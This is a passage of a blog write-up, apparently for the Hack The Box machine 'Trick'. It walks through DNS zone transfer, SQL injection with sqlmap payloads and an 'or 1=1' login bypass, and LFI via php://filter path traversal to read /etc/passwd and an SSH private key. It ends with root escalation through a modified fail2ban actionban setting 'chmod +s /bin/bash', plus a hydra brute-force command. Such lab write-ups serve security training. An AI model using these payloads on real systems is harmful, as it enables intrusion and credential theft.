</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style=display:flex><span> :: Header           : Host: FUZZ.10.10.11.166
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span> :: Threads          : <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style=display:flex><span> :: Filter           : Response size: <span style=color:#ae81ff>5480</span>
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>:: Progress: <span style=color:#f92672>[</span>4989/4989<span style=color:#f92672>]</span> :: Job <span style=color:#f92672>[</span>1/1<span style=color:#f92672>]</span> :: <span style=color:#ae81ff>173</span> req/sec :: Duration: <span style=color:#f92672>[</span>0:00:29<span style=color:#f92672>]</span> :: Errors: <span style=color:#ae81ff>0</span> ::
</span></span></code></pre></div><p>dig</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dig axfr trick.htb @10.10.11.166
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>; &lt;&lt;&gt;&gt; DiG 9.16.22-Debian &lt;&lt;&gt;&gt; axfr trick.htb @10.10.11.166
</span></span><span style=display:flex><span>;; global options: +cmd
</span></span><span style=display:flex><span>trick.htb.              <span style=color:#ae81ff>604800</span>  IN      SOA     trick.htb. root.trick.htb. <span style=color:#ae81ff>5</span> <span style=color:#ae81ff>604800</span> <span style=color:#ae81ff>86400</span> <span style=color:#ae81ff>2419200</span> <span style=color:#ae81ff>604800</span>
</span></span><span style=display:flex><span>trick.htb.              <span style=color:#ae81ff>604800</span>  IN      NS      trick.htb.
</span></span><span style=display:flex><span>trick.htb.              <span style=color:#ae81ff>604800</span>  IN      A       127.0.0.1
</span></span><span style=display:flex><span>trick.htb.              <span style=color:#ae81ff>604800</span>  IN      AAAA    ::1
</span></span><span style=display:flex><span>preprod-payroll.trick.htb. <span style=color:#ae81ff>604800</span> IN    CNAME   trick.htb.
</span></span><span style=display:flex><span>trick.htb.              <span style=color:#ae81ff>604800</span>  IN      SOA     trick.htb. root.trick.htb. <span style=color:#ae81ff>5</span> <span style=color:#ae81ff>604800</span> <span style=color:#ae81ff>86400</span> <span style=color:#ae81ff>2419200</span> <span style=color:#ae81ff>604800</span>
</span></span><span style=display:flex><span>;; Query time: <span style=color:#ae81ff>228</span> msec
</span></span><span style=display:flex><span>;; SERVER: 10.10.11.166#53<span style=color:#f92672>(</span>10.10.11.166<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>;; WHEN: Sun Jul <span style=color:#ae81ff>17</span> 00:22:31 EDT <span style=color:#ae81ff>2022</span>
</span></span><span style=display:flex><span>;; XFR size: <span style=color:#ae81ff>6</span> records <span style=color:#f92672>(</span>messages 1, bytes 231<span style=color:#f92672>)</span>
</span></span></code></pre></div><p><code>preprod-payroll.trick.htb</code> - subdomain<figure><img loading=lazy src=/images/trick_post_image_1.png></figure></p><h3 id=4-sql-injection>4. SQL Injection<a hidden class=anchor aria-hidden=true href=#4-sql-injection>#</a></h3><h4 id=41-sql-injection>4.1 SQL Injection<a hidden class=anchor aria-hidden=true href=#41-sql-injection>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /ajax.php?action<span style=color:#f92672>=</span>login HTTP/1.1
</span></span><span style=display:flex><span>Host: preprod-payroll.trick.htb:
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded; charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>X-Requested-With: XMLHttpRequest
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>53</span>
</span></span><span style=display:flex><span>Origin: http://preprod-payroll.trick.htb
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://preprod-payroll.trick.htb/login.php
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>i20dsqchbqo41pnnt04etht7bo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span>admin&amp;password<span style=color:#f92672>=</span>admin
</span></span></code></pre></div><pre tabindex=0><code>sqlmap -r login.req --level 5 --risk 3 --threads 10
</code></pre><p>энд доор байгаа нь логин хийгдээгүй.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap identified the following injection point<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> with a total of <span style=color:#ae81ff>733</span> HTTP<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> requests:
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>Parameter: username <span style=color:#f92672>(</span>POST<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: boolean-based blind
</span></span><span style=display:flex><span>    Title: OR boolean-based blind - WHERE or HAVING clause <span style=color:#f92672>(</span>NOT<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: username<span style=color:#f92672>=</span>admin<span style=color:#e6db74>&#39; OR NOT 9977=9977-- iBdY&amp;password=admin
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Type: error-based
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Payload: username=admin&#39;</span> OR <span style=color:#f92672>(</span>SELECT <span style=color:#ae81ff>8386</span> FROM<span style=color:#f92672>(</span>SELECT COUNT<span style=color:#f92672>(</span>*<span style=color:#f92672>)</span>,CONCAT<span style=color:#f92672>(</span>0x71786b7071,<span style=color:#f92672>(</span>SELECT <span style=color:#f92672>(</span>ELT<span style=color:#f92672>(</span>8386<span style=color:#f92672>=</span>8386,1<span style=color:#f92672>)))</span>,0x716b6b7a71,FLOOR<span style=color:#f92672>(</span>RAND<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>*2<span style=color:#f92672>))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span style=color:#f92672>)</span>a<span style=color:#f92672>)</span>-- tdzQ&amp;password<span style=color:#f92672>=</span>admin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: time-based blind
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12 AND time-based blind <span style=color:#f92672>(</span>query SLEEP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: username<span style=color:#f92672>=</span>admin<span style=color:#e6db74>&#39; AND (SELECT 1569 FROM (SELECT(SLEEP(5)))MHct)-- pTTW&amp;password=admin
</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[00:47:01] [INFO] the back-end DBMS is MySQL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>web application technology: Nginx 1.14.2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[00:47:02] [INFO] fetched data logged to text files under &#39;</span>/home/va4mi/.local/share/sqlmap/output/preprod-payroll.trick.htb<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00:47:02<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> your sqlmap version is outdated
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ending @ 00:47:02 /2022-07-17/
</span></span></code></pre></div><p>Үүгээр логин хийсэн:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39;or 1=1 -- -
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74># username: &#39;</span>or 1<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -- -
</span></span><span style=display:flex><span><span style=color:#75715e># password: admin</span>
</span></span></code></pre></div><p>login хийгээд авсан creds:
Administrator - Enemigosss</p><h4 id=42-php-filter>4.2 PHP Filter<a hidden class=anchor aria-hidden=true href=#42-php-filter>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://preprod-payroll.trick.htb/index.php?page<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>index
</span></span></code></pre></div><pre tabindex=0><code>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:112:121::/var/lib/saned:/usr/sbin/nologincolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologinhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:118:65534::/run/sshd:/usr/sbin/nologinpostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologinbind:x:120:128::/var/cache/bind:/usr/sbin/nologinmichael:x:1001:1001::/home/michael:/bin/bash
</code></pre><pre tabindex=0><code>http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/etc/nginx/sites-available/default%27),4,5,6,7,8
</code></pre><pre tabindex=0><code>server {	listen 80 default_server;	listen [::]:80 default_server;	server_name trick.htb;	root /var/www/html;	index index.html index.htm index.nginx-debian.html;	server_name _;	location / {		try_files $uri $uri/ =404;	}	location ~ \.php$ {		include snippets/fastcgi-php.conf;		fastcgi_pass unix:/run/php/php7.3-fpm.sock;	}}server {	listen 80;	listen [::]:80;	server_name preprod-marketing.trick.htb;	root /var/www/market;	index index.php;	location / {		try_files $uri $uri/ =404;	}        location ~ \.php$ {                include snippets/fastcgi-php.conf;                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;        }}server {        listen 80;        listen [::]:80;        server_name preprod-payroll.trick.htb;        root /var/www/payroll;        index index.php;        location / {                try_files $uri $uri/ =404;        }        location ~ \.php$ {                include snippets/fastcgi-php.conf;                fastcgi_pass unix:/run/php/php7.3-fpm.sock;        }}
</code></pre><p><code>preprod-marketing.trick.htb</code> - subdimain</p><h4 id=43-lfi>4.3 LFI<a hidden class=anchor aria-hidden=true href=#43-lfi>#</a></h4><pre tabindex=0><code>http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//....//....//....//....//etc/passwd
</code></pre><p>etc/passwd</p><pre tabindex=0><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
</code></pre><p>id_rsa</p><pre tabindex=0><code>http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
</code></pre><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZ**********************
-----END OPENSSH PRIVATE KEY-----
</code></pre><p>ssh login</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i id_rsa michael@trick.htb
</span></span></code></pre></div><p>user.txt</p><pre tabindex=0><code>8273f35**********
</code></pre><h3 id=5-privilege-escalation>5. Privilege escalation<a hidden class=anchor aria-hidden=true href=#5-privilege-escalation>#</a></h3><p>groups</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>michael security
</span></span></code></pre></div><p>sudo -l</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> michael on trick:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User michael may run the following commands on trick:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /etc/init.d/fail2ban restart
</span></span></code></pre></div><p><code>fail2ban</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fail2ban/    firefox-esr/ fonts/       foomatic/    fstab        fuse.conf    fwupd/       
</span></span><span style=display:flex><span>michael@trick:~$ ls -lh /etc/fail2ban/
</span></span><span style=display:flex><span>total 60K
</span></span><span style=display:flex><span>drwxrwx--- <span style=color:#ae81ff>2</span> root security 4.0K Jul <span style=color:#ae81ff>26</span> 15:39 action.d
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root     2.3K Jul <span style=color:#ae81ff>26</span> 15:39 fail2ban.conf
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> root root     4.0K Jul <span style=color:#ae81ff>26</span> 15:39 fail2ban.d
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>3</span> root root     4.0K Jul <span style=color:#ae81ff>26</span> 15:39 filter.d
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root      23K Jul <span style=color:#ae81ff>26</span> 15:39 jail.conf
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> root root     4.0K Jul <span style=color:#ae81ff>26</span> 15:39 jail.d
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root      <span style=color:#ae81ff>645</span> Jul <span style=color:#ae81ff>26</span> 15:39 paths-arch.conf
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root     2.8K Jul <span style=color:#ae81ff>26</span> 15:39 paths-common.conf
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root      <span style=color:#ae81ff>573</span> Jul <span style=color:#ae81ff>26</span> 15:39 paths-debian.conf
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root      <span style=color:#ae81ff>738</span> Jul <span style=color:#ae81ff>26</span> 15:39 paths-opensuse.conf
</span></span></code></pre></div><p><code>drwxrwx--- 2 root security 4.0K Jul 26 15:39 action.d</code></p><p>iptables-multiport.conf -г tmp руу хуулаад өөрчлөлт оруулах</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/
</span></span><span style=display:flex><span>cd tmp
</span></span><span style=display:flex><span>vi iptables-multiport.conf
</span></span><span style=display:flex><span><span style=color:#75715e># өөрчлөх actionban</span>
</span></span><span style=display:flex><span><span style=color:#75715e># actionban = chmod +s /bin/bash</span>
</span></span><span style=display:flex><span>rm -f /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style=display:flex><span>cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style=display:flex><span>sudo /etc/init.d/fail2ban restart
</span></span></code></pre></div><p>hydra</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># local vm</span>
</span></span><span style=display:flex><span>hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># machine vm</span>
</span></span><span style=display:flex><span>michael@trick:/tmp$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1168776</span> Apr <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2019</span> /bin/bash
</span></span></code></pre></div><p><code>/bin/bash -p</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bash-5.0# whoami
</span></span><span style=display:flex><span>root
</span></span></code></pre></div><p>root.txt</p><pre tabindex=0><code>4dba7ffb*****
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>